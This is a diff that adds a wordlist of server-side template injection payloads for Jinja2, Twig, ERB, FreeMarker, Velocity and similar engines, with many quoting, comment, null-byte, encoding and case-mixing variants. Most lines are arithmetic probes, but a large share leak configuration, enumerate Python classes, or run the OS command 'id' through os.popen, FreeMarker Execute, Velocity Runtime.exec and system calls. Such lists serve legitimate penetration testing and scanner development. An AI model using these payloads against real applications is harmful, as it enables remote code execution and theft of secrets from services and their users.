@@ -1,0 +1,324 @@
+{{7*7}}
+{{7*7}}--
+{{7*7}}#
+{{7*7}}/*
+{{7*7}}%0a
+{{7*7}}%00
+'{{7*7}}
+'{{7*7}}--
+'{{7*7}}#
+'{{7*7}}/*
+'{{7*7}}%0a
+'{{7*7}}%00
+"{{7*7}}
+"{{7*7}}--
+"{{7*7}}#
+"{{7*7}}/*
+"{{7*7}}%0a
+"{{7*7}}%00
+{{7*7}};
+{{7*7}}'
+{{7*7}}"
+{{7*7}})
+{{7*7}} //
+X-{{7*7}}
+X-{{7*7}};
+X-{{7*7}}'
+X-{{7*7}}"
+X-{{7*7}})
+X-{{7*7}} //
+test-{{7*7}}
+test-{{7*7}};
+test-{{7*7}}'
+test-{{7*7}}"
+test-{{7*7}})
+test-{{7*7}} //
+%7B%7B7%2A7%7D%7D
+%257B%257B7%252A7%257D%257D
+{{7*'7'}}
+{{7*'7'}}--
+{{7*'7'}}#
+{{7*'7'}}/*
+{{7*'7'}}%0a
+{{7*'7'}}%00
+'{{7*'7'}}
+'{{7*'7'}}--
+'{{7*'7'}}#
+'{{7*'7'}}/*
+'{{7*'7'}}%0a
+'{{7*'7'}}%00
+"{{7*'7'}}
+"{{7*'7'}}--
+"{{7*'7'}}#
+"{{7*'7'}}/*
+"{{7*'7'}}%0a
+"{{7*'7'}}%00
+{{7*'7'}};
+{{7*'7'}}'
+{{7*'7'}}"
+{{7*'7'}})
+{{7*'7'}} //
+X-{{7*'7'}}
+X-{{7*'7'}};
+X-{{7*'7'}}'
+X-{{7*'7'}}"
+X-{{7*'7'}})
+X-{{7*'7'}} //
+test-{{7*'7'}}
+test-{{7*'7'}};
+test-{{7*'7'}}'
+test-{{7*'7'}}"
+test-{{7*'7'}})
+test-{{7*'7'}} //
+%7B%7B7%2A%277%27%7D%7D
+%257B%257B7%252A%25277%2527%257D%257D
+{{config.items()}}
+{{config.items()}}--
+{{config.items()}}#
+{{config.items()}}/*
+{{config.items()}}%0a
+{{config.items()}}%00
+'{{config.items()}}
+'{{config.items()}}--
+'{{config.items()}}#
+'{{config.items()}}/*
+'{{config.items()}}%0a
+'{{config.items()}}%00
+"{{config.items()}}
+"{{config.items()}}--
+"{{config.items()}}#
+"{{config.items()}}/*
+"{{config.items()}}%0a
+"{{config.items()}}%00
+{{config.items()}};
+{{config.items()}}'
+{{config.items()}}"
+{{config.items()}})
+{{config.items()}} //
+X-{{config.items()}}
+X-{{config.items()}};
+X-{{config.items()}}'
+X-{{config.items()}}"
+X-{{config.items()}})
+X-{{config.items()}} //
+test-{{config.items()}}
+test-{{config.items()}};
+test-{{config.items()}}'
+test-{{config.items()}}"
+test-{{config.items()}})
+test-{{config.items()}} //
+%7B%7Bconfig.items%28%29%7D%7D
+%257B%257Bconfig.items%2528%2529%257D%257D
+{{CONFIG.ITEMS()}}
+{{cOnFiG.ItEmS()}}
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}--
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}#
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}/*
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}%0a
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}%00
+'{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}
+'{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}--
+'{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}#
+'{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}/*
+'{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}%0a
+'{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}%00
+"{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}
+"{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}--
+"{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}#
+"{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}/*
+"{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}%0a
+"{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}%00
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %};
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}'
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}"
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %})
+{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %} //
+X-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}
+X-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %};
+X-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}'
+X-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}"
+X-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %})
+X-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %} //
+test-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}
+test-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %};
+test-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}'
+test-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %}"
+test-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %})
+test-{% for c in [].__class__.__mro__[2].__subclasses__() %}{{c}}{% endfor %} //
+%7B%25%20for%20c%20in%20%5B%5D.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%25%7D%7B%7Bc%7D%7D%7B%25%20endfor%20%25%7D
+%257B%2525%2520for%2520c%2520in%2520%255B%255D.__class__.__mro__%255B2%255D.__subclasses__%2528%2529%2520%2525%257D%257B%257Bc%257D%257D%257B%2525%2520endfor%2520%2525%257D
+{%%20for%20c%20in%20[].__class__.__mro__[2].__subclasses__()%20%}{{c}}{%%20endfor%20%}
+{%+for+c+in+[].__class__.__mro__[2].__subclasses__()+%}{{c}}{%+endfor+%}
+{%/**/for/**/c/**/in/**/[].__class__.__mro__[2].__subclasses__()/**/%}{{c}}{%/**/endfor/**/%}
+{% FOR C IN [].__CLASS__.__MRO__[2].__SUBCLASSES__() %}{{C}}{% ENDFOR %}
+{% FoR C In [].__ClAsS__.__MrO__[2].__sUbClAsSeS__() %}{{C}}{% EnDfOr %}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}--
+{{ cycler.__init__.__globals__.os.popen('id').read() }}#
+{{ cycler.__init__.__globals__.os.popen('id').read() }}/*
+{{ cycler.__init__.__globals__.os.popen('id').read() }}%0a
+{{ cycler.__init__.__globals__.os.popen('id').read() }}%00
+'{{ cycler.__init__.__globals__.os.popen('id').read() }}
+'{{ cycler.__init__.__globals__.os.popen('id').read() }}--
+'{{ cycler.__init__.__globals__.os.popen('id').read() }}#
+'{{ cycler.__init__.__globals__.os.popen('id').read() }}/*
+'{{ cycler.__init__.__globals__.os.popen('id').read() }}%0a
+'{{ cycler.__init__.__globals__.os.popen('id').read() }}%00
+"{{ cycler.__init__.__globals__.os.popen('id').read() }}
+"{{ cycler.__init__.__globals__.os.popen('id').read() }}--
+"{{ cycler.__init__.__globals__.os.popen('id').read() }}#
+"{{ cycler.__init__.__globals__.os.popen('id').read() }}/*
+"{{ cycler.__init__.__globals__.os.popen('id').read() }}%0a
+"{{ cycler.__init__.__globals__.os.popen('id').read() }}%00
+{{ cycler.__init__.__globals__.os.popen('id').read() }};
+{{ cycler.__init__.__globals__.os.popen('id').read() }}'
+{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+{{ cycler.__init__.__globals__.os.popen('id').read() }})
+{{ cycler.__init__.__globals__.os.popen('id').read() }} //
+X-{{ cycler.__init__.__globals__.os.popen('id').read() }}
+X-{{ cycler.__init__.__globals__.os.popen('id').read() }};
+X-{{ cycler.__init__.__globals__.os.popen('id').read() }}'
+X-{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+X-{{ cycler.__init__.__globals__.os.popen('id').read() }})
+X-{{ cycler.__init__.__globals__.os.popen('id').read() }} //
+test-{{ cycler.__init__.__globals__.os.popen('id').read() }}
+test-{{ cycler.__init__.__globals__.os.popen('id').read() }};
+test-{{ cycler.__init__.__globals__.os.popen('id').read() }}'
+test-{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+test-{{ cycler.__init__.__globals__.os.popen('id').read() }})
+test-{{ cycler.__init__.__globals__.os.popen('id').read() }} //
+%7B%7B%20cycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%20%7D%7D
+%257B%257B%2520cycler.__init__.__globals__.os.popen%2528%2527id%2527%2529.read%2528%2529%2520%257D%257D
+{{%20cycler.__init__.__globals__.os.popen('id').read()%20}}
+{{+cycler.__init__.__globals__.os.popen('id').read()+}}
+{{/**/cycler.__init__.__globals__.os.popen('id').read()/**/}}
+{{ CYCLER.__INIT__.__GLOBALS__.OS.POPEN('ID').READ() }}
+{{ CyClEr.__iNiT__.__GlObAlS__.Os.pOpEn('Id').rEaD() }}
+<%= 7*7 %>
+<%= 7*7 %>--
+<%= 7*7 %>#
+<%= 7*7 %>/*
+<%= 7*7 %>%0a
+<%= 7*7 %>%00
+'<%= 7*7 %>
+'<%= 7*7 %>--
+'<%= 7*7 %>#
+'<%= 7*7 %>/*
+'<%= 7*7 %>%0a
+'<%= 7*7 %>%00
+"<%= 7*7 %>
+"<%= 7*7 %>--
+"<%= 7*7 %>#
+"<%= 7*7 %>/*
+"<%= 7*7 %>%0a
+"<%= 7*7 %>%00
+<%= 7*7 %>;
+<%= 7*7 %>'
+<%= 7*7 %>"
+<%= 7*7 %>)
+<%= 7*7 %> //
+X-<%= 7*7 %>
+X-<%= 7*7 %>;
+X-<%= 7*7 %>'
+X-<%= 7*7 %>"
+X-<%= 7*7 %>)
+X-<%= 7*7 %> //
+test-<%= 7*7 %>
+test-<%= 7*7 %>;
+test-<%= 7*7 %>'
+test-<%= 7*7 %>"
+test-<%= 7*7 %>)
+test-<%= 7*7 %> //
+%3C%25%3D%207%2A7%20%25%3E
+%253C%2525%253D%25207%252A7%2520%2525%253E
+<%=%207*7%20%>
+<%=+7*7+%>
+<%=/**/7*7/**/%>
+#{7*7}
+#{7*7}--
+#{7*7}#
+#{7*7}/*
+#{7*7}%0a
+#{7*7}%00
+'#{7*7}
+'#{7*7}--
+'#{7*7}#
+'#{7*7}/*
+'#{7*7}%0a
+'#{7*7}%00
+"#{7*7}
+"#{7*7}--
+"#{7*7}#
+"#{7*7}/*
+"#{7*7}%0a
+"#{7*7}%00
+#{7*7};
+#{7*7}'
+#{7*7}"
+#{7*7})
+#{7*7} //
+X-#{7*7}
+X-#{7*7};
+X-#{7*7}'
+X-#{7*7}"
+X-#{7*7})
+X-#{7*7} //
+test-#{7*7}
+test-#{7*7};
+test-#{7*7}'
+test-#{7*7}"
+test-#{7*7})
+test-#{7*7} //
+%23%7B7%2A7%7D
+%2523%257B7%252A7%257D
+${7*7}
+${7*7}--
+${7*7}#
+${7*7}/*
+${7*7}%0a
+${7*7}%00
+'${7*7}
+'${7*7}--
+'${7*7}#
+'${7*7}/*
+'${7*7}%0a
+'${7*7}%00
+"${7*7}
+"${7*7}--
+"${7*7}#
+"${7*7}/*
+"${7*7}%0a
+"${7*7}%00
+${7*7};
+${7*7}'
+${7*7}"
+${7*7})
+${7*7} //
+X-${7*7}
+X-${7*7};
+X-${7*7}'
+X-${7*7}"
+X-${7*7})
+X-${7*7} //
+test-${7*7}
+test-${7*7};
+test-${7*7}'
+test-${7*7}"
+test-${7*7})
+test-${7*7} //
+%24%7B7%2A7%7D
+%2524%257B7%252A7%257D
+{{ [].__class__.__mro__[1].__subclasses__() }}
+{{ cycler.__init__.__globals__['os'].popen('id').read() }}
+{{_self}}
+{{dump(app)}}
+{{['id']|map('system')}}
+${"freemarker.template.utility.Execute"?new()('id')}
+#set($x=7*7)$x
+$class.inspect('java.lang.Runtime').type.static.getRuntime().exec('id')
+<%= system('id') %>
+${pageContext.request.class.getResource('/').getPath()}
+{{#with this}}{{/with}}
+{{#each this}}{{/each}}
+{{_}}
